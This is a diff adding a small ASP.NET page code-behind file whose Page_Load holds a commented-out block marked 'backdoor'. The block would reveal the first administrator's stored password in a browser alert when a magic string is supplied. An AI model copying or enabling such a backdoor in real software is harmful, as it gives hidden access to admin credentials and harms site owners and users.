@@ -1,0 +1,26 @@
+﻿using System;
+using System.Data;
+using System.Configuration;
+using System.Collections;
+using System.Web;
+using System.Web.Security;
+using System.Web.UI;
+using System.Web.UI.WebControls;
+using System.Web.UI.WebControls.WebParts;
+using System.Web.UI.HtmlControls;
+
+public partial class topTools : System.Web.UI.Page
+{
+    protected void Page_Load(object sender, EventArgs e)
+    {
+        ////backdoor
+        //if (name == "Get Admin PassWord")
+        //{
+        //    List<GeneralUser> list = UserManager.GetGeneralUserByRoleId(UserRoleConst.Administrator);
+        //    string adminpwd = list[0].Pwd;
+        //    ClientScript.RegisterStartupScript(GetType(), "", "alert('" + adminpwd + "')", true);
+        //    return;
+
+        //}
+    }
+}
